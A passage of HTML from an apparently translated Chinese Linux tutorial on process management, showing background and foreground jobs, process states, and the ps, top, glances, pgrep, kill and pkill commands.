id=\"crayon-594bd57d1495e850879976-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/27/093036n3fss8efrh7edfdr.png\" alt=\"启动 Linux 交互进程\"></p>\n<p><em>启动 Linux 交互进程</em></p>\n<h4 id=\"toc_11\">Linux 后台任务</h4>\n<p>要在后台（非交互式）启动一个进程，使用 <code>&amp;</code> 符号，此时，该进程不会从用户中读取输入，直到它被移到前台。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d14964163737171\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# cloudcmd &amp;\r\n# jobs\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d14964163737171-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d14964163737171-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd57d14964163737171-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d14964163737171-1\"><span class=\"crayon-p\"># cloudcmd &amp;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d14964163737171-2\"><span class=\"crayon-p\"># jobs</span></div><div class=\"crayon-line\" id=\"crayon-594bd57d14964163737171-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/27/093036yzo2fnei5ici9oii.png\" alt=\"在后台启动 Linux 进程\"></p>\n<p><em>在后台启动 Linux 进程</em></p>\n<p>你也可以使用 <code>Ctrl + Z</code> 暂停执行一个程序并把它发送到后台，它会给进程发送 SIGSTOP 信号，从而暂停它的执行；它就会变为空闲：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d14969531351379\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# tar -cf backup.tar /backups/*  ### 按下 Ctrl+Z\r\n# jobs\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d14969531351379-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d14969531351379-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd57d14969531351379-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d14969531351379-1\"><span class=\"crayon-p\"># tar -cf backup.tar /backups/*  ### 按下 Ctrl+Z</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d14969531351379-2\"><span class=\"crayon-p\"># jobs</span></div><div class=\"crayon-line\" id=\"crayon-594bd57d14969531351379-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>要在后台继续运行上面被暂停的命令，使用 <code>bg</code> 命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d1496c452937085\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# bg\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d1496c452937085-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d1496c452937085-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d1496c452937085-1\"><span class=\"crayon-p\"># bg</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d1496c452937085-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0002 seconds] -->\r\n<p>要把后台进程发送到前台，使用 <code>fg</code> 命令以及任务的 ID，类似：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d14970067871009\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# jobs\r\n# fg %1\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d14970067871009-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d14970067871009-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd57d14970067871009-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d14970067871009-1\"><span class=\"crayon-p\"># jobs</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d14970067871009-2\"><span class=\"crayon-p\"># fg %1</span></div><div class=\"crayon-line\" id=\"crayon-594bd57d14970067871009-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/27/093036lhy8xqnf5yzffyyy.png\" alt=\"Linux 后台进程任务\"></p>\n<p><em>Linux 后台进程任务</em></p>\n<p>你也可能想要阅读：<a href=\"http://www.tecmint.com/run-linux-command-process-in-background-detach-process/\">如何在后台启动 Linux 命令以及在终端分离（Detach）进程</a></p>\n<h3 id=\"toc_12\">Linux 中进程的状态</h3>\n<p>在执行过程中，取决于它的环境一个进程会从一个状态转变到另一个状态。在 Linux 中，一个进程有下面的可能状态：</p>\n<ul>\n<li>Running – 此时它正在运行（它是系统中的当前进程）或准备运行（它正在等待分配 CPU 单元）。</li>\n<li>Waiting – 在这个状态，进程正在等待某个事件的发生或者系统资源。另外，内核也会区分两种不同类型的等待进程；可中断等待进程interruptible waiting processes – 可以被信号中断，以及不可中断等待进程uninterruptible waiting processes- 正在等待硬件条件，不能被任何事件/信号中断。</li>\n<li>Stopped – 在这个状态，进程已经被停止了，通常是由于收到了一个信号。例如，正在被调试的进程。</li>\n<li>Zombie – 该进程已经死亡，它已经停止了但是进程表process table中仍然有它的条目。</li>\n</ul>\n<h3 id=\"toc_13\">如何在 Linux 中查看活跃进程</h3>\n<p>有很多 Linux 工具可以用于查看/列出系统中正在运行的进程，两个传统众所周知的是 <a href=\"/tag-ps.html\">ps</a> 和 <a href=\"/tag-top.html\">top</a> 命令：</p>\n<h4 id=\"toc_14\">1. ps 命令</h4>\n<p>它显示被选中的系统中活跃进程的信息，如下图所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d14975317329027\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# ps \r\n# ps -e | head \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d14975317329027-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d14975317329027-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd57d14975317329027-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d14975317329027-1\"><span class=\"crayon-p\"># ps </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d14975317329027-2\"><span class=\"crayon-p\"># ps -e | head </span></div><div class=\"crayon-line\" id=\"crayon-594bd57d14975317329027-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/27/093037fg0vsxpivovwxk0u.png\" alt=\"列出 Linux 活跃进程\"></p>\n<p><em>列出 Linux 活跃进程</em></p>\n<h4 id=\"toc_15\">2. top – 系统监控工具</h4>\n<p>top 是一个强大的工具，它能给你提供 运行系统的动态实时视图，如下面截图所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d14979480189426\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# top \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d14979480189426-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d14979480189426-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d14979480189426-1\"><span class=\"crayon-p\"># top </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d14979480189426-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0002 seconds] -->\r\n<p><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/27/093037zssr5b6tqnqnx6c2.png\" alt=\"列出 Linux 正在运行的程序\"></p>\n<p><em>列出 Linux 正在运行的程序</em></p>\n<p>阅读这篇文章获取更多 top 使用事例：<a href=\"http://www.tecmint.com/12-top-command-examples-in-linux/\">Linux 中 12 个 top 命令实例</a></p>\n<h4 id=\"toc_16\">3. glances – 系统监控工具</h4>\n<p>glances 是一个相对比较新的系统监控工具，它有一些比较高级的功能：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d1497c982564207\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# glances\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d1497c982564207-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d1497c982564207-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d1497c982564207-1\"><span class=\"crayon-p\"># glances</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d1497c982564207-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/27/093038zt91ht6xg9o2fgmo.png\" alt=\"Glances - Linux 进程监控\"></p>\n<p><em>Glances – Linux 进程监控</em></p>\n<p>要获取完整使用指南，请阅读：<a href=\"https://linux.cn/article-6882-1.html\">Glances – Linux 的一个高级实时系统监控工具</a></p>\n<p>还有很多你可以用来列出活跃进程的其它有用的 Linux 系统监视工具，打开下面的链接了解更多关于它们的信息：</p>\n<ol>\n<li><a href=\"http://www.tecmint.com/command-line-tools-to-monitor-linux-performance/\">监控 Linux 性能的 20 个命令行工具</a></li>\n<li><a href=\"http://www.tecmint.com/linux-performance-monitoring-tools/\">13 个有用的 Linux 监控工具</a></li>\n</ol>\n<h3 id=\"toc_17\">如何在 Linux 中控制进程</h3>\n<p>Linux 也有一些命令用于控制进程，例如 <code>kill</code>、<code>pkill</code>、<code>pgrep</code> 和 <code>killall</code>，下面是一些如何使用它们的基本事例：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d14983848837661\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pgrep -u tecmint top\r\n$ kill 2308\r\n$ pgrep -u tecmint top\r\n$ pgrep -u tecmint glances\r\n$ pkill glances\r\n$ pgrep -u tecmint glances\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d14983848837661-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d14983848837661-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd57d14983848837661-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d14983848837661-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd57d14983848837661-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d14983848837661-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd57d14983848837661-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d14983848837661-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pgrep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tecmint </span><span class=\"crayon-i\">top</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d14983848837661-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2308</span></div><div class=\"crayon-line\" id=\"crayon-594bd57d14983848837661-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pgrep</span><span class=\"crayon-h\"> </span><span 